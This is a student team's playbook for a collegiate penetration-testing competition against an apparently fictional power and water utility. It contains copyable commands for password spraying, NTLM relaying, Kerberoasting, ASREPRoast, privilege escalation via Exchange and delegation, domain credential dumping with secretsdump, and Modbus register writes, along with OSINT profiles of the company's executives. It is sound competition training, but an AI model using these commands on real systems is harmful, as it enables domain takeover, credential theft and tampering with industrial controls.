# 2020 Collegiate Penetration Testing Competition Packet

## Google Drive Structure
* `<name>/` - misc notes
    * `logs/` - from `~/logs`
    * `screenshots/`
* `scans/` - files each with one scan output
* `lists/` - username and password lists

## VDI Setup

### Windows VDI
Recommended software to install:
* Bitvise SSH client - https://bitvise.com/ssh-client-download
* Wireshark - https://www.wireshark.org/download.html
* Greenshot (screenshot) - https://getgreenshot.org/downloads/

### Linux VDI
Use Bitvise from Windows VDI to SSH to Linux VDI. On first login, do this to enable logging:
```sh
mkdir ~/logs
echo "script ~/logs/\$(date +%s).log" >> .bash_profile
```
Optional Windows AD tools:
```sh
git clone https://github.com/fox-it/mitm6.git
cd mitm6
sudo pip install .
```
```sh
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
sudo pip install .
```

## Scripts

### Password List
Type into file `old.txt`:
```
august
september
october
summer
fall
winter
corona
covid19
ngpw
ngpew
power
electricity
water
smallville
StrongPassword1
WestThompsonDam
OrchardStreetDam
Mustangs
TullyDam
```
Run this Python script (comments not needed):
```python
# Read the original passwords
with open("old.txt", "r") as f:
	o = list(filter(None, f.read().split("\n")))

# Add years
for x in o[:]:
	if not x[0].isdigit():
		o.append(x + "20")
		o.append(x + "2020")
		o.append(x + "1")

# Add capitals
for x in o[:]:
	if x[0].islower():
		o.append(x.capitalize())

# Add special characters
for x in o[:]:
	o.append(x + "!")
	o.append(x + "?")

# Write to file
with open("new.txt", "w") as f:
	f.write("\n".join(o))
```
Add `new.txt` to `lists/` in the Google Drive.

## Reconnaissance
Initial scan (add to new Google Drive file in `scans/`):
```sh
nmap <ip_range> -T5 -sS -n -F -oN scan_short.txt
```
Much longer scan (add to a new Google Drive file in `scans/`):
```sh
nmap <ip_range> -T5 -sS -n -p- -A --version-all -oN scan_long.txt
```
Add `-iL <filename>` to take in target IPs via a file. Add these options for a slower scan if you get blocked:
```sh
-f --mtu 32 --ttl 64 -T1
```
Dump traffic (use Bitvise on Windows to retrieve the PCAP and open it in Wireshark):
```
ifconfig # find name of interface
tcpdump -i <interface> -s 65535 -w dump.pcap
```

## Web
Find pages:
```sh
dirb <url_base>
```
Scan for vulnerabilities:
```sh
nikto -h <ip> -p <port> # can also pass file with list of IPs
```

## Windows AD
More resources at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md.

### Initial access
Spray passwords on SMB (careful locking accounts):
```sh
crackmapexec smb <ip> -u <username_list> -p <password_list> --continue-on-success
```
Spray passwords on Kerberos (https://github.com/ropnop/kerbrute/tags) (careful locking accounts):
```sh
./kerbrute userenum -d <domain_name> <username_list>
./kerbrute passwordspray -d <domain_name> <username_list> <password>
./kerbrute bruteuser -d <domain_name> username <password_list>
```
ASREPRoast (can also be done via Rubeus on Windows):
```sh
crackmapexec ldap <ip> -u <username_list> -p '' --asreproast output.txt\
hashcat -m18200 output.txt <password_list>
```
May get NTLMv2 hash:
```sh
responder -I <interface> --wpad
```
May get a shell (need mitm6 and impacket):
```sh
mitm6 -i <interface> -d <domain_name>
ntlmrelayx.py -wh <your_ip> -t smb://<ip> -i # in new terminal
```

### Escalation
Kerberoasting (need domain account):
```sh
crackmapexec ldap <ip> -u <username> -p <password> --kerberoasting output.txt
hashcat -m13100 output.txt <password_list>
```
Same thing with impacket:
```sh
GetUserSPNs.py -request -dc-ip <ip> <domain_name>/<username>
```
Microsoft Exchange escalation (need impacket):
```sh
wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/privexchange.py
ntlmrelayx.py -t ldap://<ip> --escalate-user <username>
python privexchange.py -ah <your_ip> <hostname>.<domain_name> -u <username> -d <domain_name> -p <password> # in new terminal
secretsdump.py <domain_name>/<username><hostname>.<domain_name> -just-dc # in new terminal
```
Resource-based constrained delegation (need mitm6 and impacket):
```sh
mitm6 -i <interface> -d <domain_name>
ntlmrelayx.py -t ldaps://<hostname>.<domain_name> -wh <your_ip> --delegate-access # in new terminal
gtST.py -spn cifs/<hostname>.<domain_name>/<new_username>\$ -dc-ip <ip> -impersonate Administrator # in new terminal
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <hostname>.<domain_name>
```

## SCADA
Good summary: https://github.com/nationalcptc-teamtools/University-of-Southern-California/blob/main/misc/scada.txt.

### Modbus
Sniff traffic via `tcpdump` or Wireshark to understand the traffic. Pentration testing framework: https://github.com/theralfbrown/smod-1. Metasploit has a client:
```
use auxiliary/scanner/scada/modbusclient
show actions
set action <action_name>
show options
run
```
PyModbus (`pip install pymodbus`) can be used to read and write to registers:
```python
from pymodbus.client.sync import ModbusTcpClient
client = ModbusTcpClient("127.0.0.1")
client.write_coil(1, True)
result = client.read_coils(1, 1)
print(result.bits[0])
client.close()
# https://pymodbus.readthedocs.io/en/latest/source/library/pymodbus.client.html
```

## OSINT

### Password Policy
* More than 3 or 4 characters
* Less than 20 characters

### Company
* Headquarted in Smallville, NY 14773
* 51-200 employees
* Founded in 1980

### People
* Grace Grantham
    * Position: Chief Executive Officer since August 2019
    * Location: Salamanca, NY
    * Education: Western Governors University MBA (2004-2007), Humboldt State University Bachelor's in Environmental Science (2003-2007)
    * Founder/CEO of H2Mon (June 2009-March 2019) in Bay Area
    * Likes Melinda Gates
* King Shields
    * Position: Chief Operating Officer since December 2001
    * Location: Buffalo-Niagara Falls Area
    * Education: Cornell University MEng/MBA (2009-2012), University of Pennsylvania Bachelor’s in Hydrology/EE (1993-1998)
    * At NGPEW for 20+ years, in management for 10+ years
* Tiny Glover
    * Position: Chief Engineering Officer
    * Location: Portland, OR
    * Enjoys golf, averages a 98
* Gaylord Schaefer
    * Position: Director of Information Technology since May 1996
    * Location: Salamanca, NY
    * Education: University of Montevallo BS in Art (1987-1993)
    * Skilled in Windows 95/98
* Maxie Thompson
    * Position: Director of Safety
* Barbara Leuschke
    * Position: Director of Human Resources since July 2017
    * Location: Buffalo-Niagara Falls Area
    * Education: Barnard College Master’s in Industrial/Organizational Psychology (2012-2014), University of Michigan Bachelor’s in HR Management/Services (2008-2012)

## Legal Information
NGPEW has a Critical Infrastructure Engineering Enhancement Grant (from LexCorp and DHS). Could not find anymore information.

### FERC/NERC
The Energy Policy Act of 2005 (Energy Policy Act) gave the Federal Energy Regulatory Commission (Commission or FERC) authority to oversee the reliability of the bulk power system, commonly referred to as the bulk electric system or the power grid. This includes authority to approve mandatory cybersecurity reliability standards.

The North American Electric Reliability Corporation (NERC), which FERC has certified as the nation’s Electric Reliability Organization, developed Critical Infrastructure Protection (CIP) cyber security reliability standards. On January 18, 2008, the Commission issued Order No. 706, the Final Rule approving the CIP reliability standards, while concurrently directing NERC to develop significant modifications addressing specific concerns.

### CIP
* Violations
    * Lower, Moderate, High, or Severe VSL (Violation Security Level)
    * Up to $1M per violation per day
    * Utility company fined $10M last year for multiple violations
* Bulk Electric System (BES) = 100 kV or higher
* CIP-002-5.1a - BES Cyber System Categorization
    * Defines high, medium, and low impact BES systems
* CIP-010-3 - Configuration Change Management and Vulnerability Assessments
    * Prevent/detect unauthorized changes to BES cyber systems
    * Addresses periodic vulnerability assessments, removable media, monitoring/authorizing/documenting configuration changes
* CIP-005-6 - Electronic Security Perimeter(s)
    * Monitor/authorize inbound/outbound connections
* CIP-011-2 - Information Protection
    * Procedures for storage/transit/use of sensitive information
* CIP-004-6 - Personnel & Training
    * Verify user account and privileges are correct
    * Revoke access and change passwords
* CIP-003-8 - Security Management Controls
    * Policy stuff
* CIP-007-6 - System Security Management
    * Enable only logical network ports that are needed
    * Protect against use of unnecessary physical ports, console commands, removable media
    * Implement patch management process
    * Deter/detect/prevent malicious code
    * Log events like logins and malicious code
    * Enforce authentication of interactive user access
    * Identify default/generic accounts
    * Identify individuals with access to shared accounts
    * Change default passwords, enforce periodic password changes
    * Password length at least 8 and 3+ different types of characters
    * Limit number of failed logins

### PSA
The Department of Homeland Security, Cybersecurity and Infrastructure Security Agency (CISA), Infrastructure Security Division operates the Protective Security Advisor (PSA) Program. PSAs are trained critical infrastructure protection and vulnerability mitigation subject matter experts who facilitate local field activities in coordination with other Department of Homeland Security offices. They also advise and assist state, local, and private sector officials and critical infrastructure facility owners and operators.
* Plan, coordinate, and conduct security surveys and assessments – PSAs conduct voluntary, non-regulatory security surveys and assessments on critical infrastructure assets and facilities within their respective regions.
* Plan and conduct outreach activities – PSAs conduct outreach activities with critical infrastructure owners and operators, community groups, and faith-based organizations in support of CISA priorities.
* Respond to incidents – PSAs plan for and, when directed, deploy to Unified Area Command Groups, Joint Operations Centers, Federal Emergency Management Agency Regional Response Coordination Centers, and/or State and local Emergency Operations Centers in response to natural or man-made incidents.

### PCII
Final Rule: https://www.cisa.gov/sites/default/files/publications/pcii-final-rule-federal-register-09-01-06-508.pdf
* CII = critical infrastructure information
    * Information related to the security of CI or protected systems
    * Includes documents, records, or other information concerning threats, vulnerabilities, and operational experience
* PCII must be:
    * Voluntarily submitted
    * Not customarily available in the public domain
    * Not submitted in lieu of compliance with any regulatory requirement
    * Also must include Express Statement and Certification Statement
* Submitter:
    * Owner of information being submitted
    * Has sufficient knowledge of the information to affirm it is being submitted voluntarily
    * Has sufficient knowledge of the information to affirm it is not lawfully, properly, and regulary disclosed generally or broadly to the public
    * Includes government, representatives of companies, industry associations, individuals capable of analyzing CI, working groups
* PCII markings (done by PCII office):
    * PCII cover sheet
    * "Protected Critical Infrastructure Information" in the headers and footers
    * Identification number
    * Labeled with required Protection Statement
* To access PCII:
    * Need to be trained in handling/safeguarding
    * Have homeland security responsibilities as specified in CII Act of 2002, the Final Rule
    * Have a need to know
    * Sign an NDA (non-Federal employees)
* Violation of PCII
    * Any officer or employee of the United States or of any department or agency thereof is subject to penalties by knowingly publishing, disclosing, divulging, and/or making PCII known in any manner not authorized by law
    * Fined up to $250,000
    * Imprisoned up to one year
    * Remove from office or employment